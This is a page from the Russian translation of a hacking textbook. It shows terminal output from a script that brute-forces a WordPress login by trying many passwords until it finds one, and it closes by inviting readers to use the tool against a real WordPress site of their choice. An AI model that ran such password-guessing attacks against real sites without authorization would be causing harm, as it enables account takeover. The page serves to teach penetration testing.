# Black Hat Python. Программирование для хакеров и пентестеров — страница 119

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

Взлом HTML-формы аутентификации методом перебора   119
и 1234567  в качестве пароля, чтобы убедиться в том, что все работает. По
счастливому стечению обстоятельств этот же пароль присутствует в файле
cain.txt, примерно 30-й по счету . Запустив скрипт, мы получим следующий
вывод:
(bhp) tim@kali:~/bhp/bhp$ python wordpress_killer.py
Brute Force Attack beginning on http://boodelyboo.com/wordpress/wp-login.php.
Finished the setup where username = tim
Trying username/password tim/!@#$%
Trying username/password tim/!@#$%^
Trying username/password tim/!@#$%^&
--пропущено--
Trying username/password tim/0racl38i
Bruteforcing successful.
Username is tim
Password is 1234567
done: now cleaning up.
(bhp) tim@kali:~/bhp/bhp$
Как видите, скрипт успешно подобрал пароль и вошел в консоль W ordPress.
Чтобы это подтвердить, попробуйте аутентифицироваться вручную, исполь-
зуя те же учетные данные. Проверив свой инструмент локально и убедившись
в том, что он работает, можете применить его для атаки на реальное прило-
жение W ordPress на свой выбор.
